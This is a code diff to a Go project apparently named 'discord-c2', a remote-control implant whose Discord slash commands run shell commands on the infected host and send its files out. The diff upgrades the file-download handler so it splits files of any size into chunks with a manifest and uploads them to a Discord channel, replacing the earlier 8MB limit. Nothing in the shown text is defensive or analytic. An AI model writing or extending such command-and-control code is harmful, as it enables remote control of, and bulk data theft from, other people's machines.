@@ -4,6 +4,7 @@ package commands
 // download, and upload.
 
 import (
+	"fmt"
 	"io"
 	"os"
 	"path/filepath"
@@ -12,9 +13,19 @@ import (
 
 	"discord-c2/internal/httpx"
 	"discord-c2/internal/shell"
+	"discord-c2/internal/transfer"
 
 	"github.com/bwmarrin/discordgo"
 )
+
+var transferChunkSize int64 = transfer.DefaultChunkSize
+
+// SetTransferChunkSize configures the split size for large downloads.
+func SetTransferChunkSize(n int64) {
+	if n > 0 {
+		transferChunkSize = n
+	}
+}
 
 // handleSlashCwd runs a platform-appropriate command to show the current
 // working directory for this client.
@@ -61,8 +72,8 @@ func handleSlashLs(s *discordgo.Session, i *discordgo.InteractionCreate, data di
 	shell.Run(s, i.ChannelID, nil, cmdStr)
 }
 
-// handleSlashDownload streams a small local file back to Discord as an
-// attachment, enforcing the 8MB upload limit.
+// handleSlashDownload sends a local file to Discord. Files larger than the
+// configured chunk size are split into parts with a manifest.
 func handleSlashDownload(s *discordgo.Session, i *discordgo.InteractionCreate, data discordgo.ApplicationCommandInteractionData) {
 	var srcPath string
 	for _, opt := range data.Options {
@@ -71,13 +82,7 @@ func handleSlashDownload(s *discordgo.Session, i *discordgo.InteractionCreate, d
 		}
 	}
 	if srcPath == "" {
-		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-			Type: discordgo.InteractionResponseChannelMessageWithSource,
-			Data: &discordgo.InteractionResponseData{
-				Content: "No source path provided.",
-				Flags:   discordgo.MessageFlagsEphemeral,
-			},
-		})
+		respondEphemeral(s, i, "No source path provided.")
 		return
 	}
 	if strings.HasPrefix(srcPath, "~/") {
@@ -85,51 +90,33 @@ func handleSlashDownload(s *discordgo.Session, i *discordgo.InteractionCreate, d
 			srcPath = home + string(os.PathSeparator) + srcPath[2:]
 		}
 	}
-	f, err := os.Open(srcPath)
+	fi, err := os.Stat(srcPath)
 	if err != nil {
-		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-			Type: discordgo.InteractionResponseChannelMessageWithSource,
-			Data: &discordgo.InteractionResponseData{
-				Content: "Cannot open file: " + srcPath + " (" + err.Error() + ")",
-				Flags:   discordgo.MessageFlagsEphemeral,
-			},
-		})
+		respondEphemeral(s, i, "Cannot read file: "+srcPath+" ("+err.Error()+")")
 		return
 	}
-	defer f.Close()
-	fi, err := f.Stat()
-	if err != nil {
-		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-			Type: discordgo.InteractionResponseChannelMessageWithSource,
-			Data: &discordgo.InteractionResponseData{
-				Content: "Cannot stat file: " + srcPath + " (" + err.Error() + ")",
-				Flags:   discordgo.MessageFlagsEphemeral,
-			},
-		})
+	if fi.IsDir() {
+		respondEphemeral(s, i, srcPath+" is a directory.")
 		return
 	}
-	if fi.Size() >= 8388608 {
-		s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-			Type: discordgo.InteractionResponseChannelMessageWithSource,
-			Data: &discordgo.InteractionResponseData{
-				Content: "File is bigger than 8MB 😔",
-				Flags:   discordgo.MessageFlagsEphemeral,
-			},
-		})
-		return
+
+	respondEphemeral(s, i, "📥 Downloading `"+filepath.Base(srcPath)+"` ("+humanSize(fi.Size())+")...")
+	if err := transfer.Send(s, i.ChannelID, nil, srcPath, transferChunkSize); err != nil {
+		s.ChannelMessageSend(i.ChannelID, "Download failed: "+err.Error())
 	}
-	s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
-		Type: discordgo.InteractionResponseChannelMessageWithSource,
-		Data: &discordgo.InteractionResponseData{
-			Content: "📥 Downloading `" + filepath.Base(srcPath) + "`...",
-			Flags:   discordgo.MessageFlagsEphemeral,
-		},
-	})
-	fileStruct := &discordgo.File{Name: filepath.Base(srcPath), Reader: f}
-	fileArray := []*discordgo.File{fileStruct}
-	s.ChannelMessageSendComplex(i.ChannelID, &discordgo.MessageSend{
-		Files: fileArray,
-	})
+}
+
+func humanSize(n int64) string {
+	const unit = 1024
+	if n < unit {
+		return fmt.Sprintf("%d B", n)
+	}
+	div, exp := int64(unit), 0
+	for v := n / unit; v >= unit; v /= unit {
+		div *= unit
+		exp++
+	}
+	return fmt.Sprintf("%.1f %ciB", float64(n)/float64(div), "KMGTPE"[exp])
 }
 
 // handleSlashUpload downloads an attachment from Discord and writes it to a
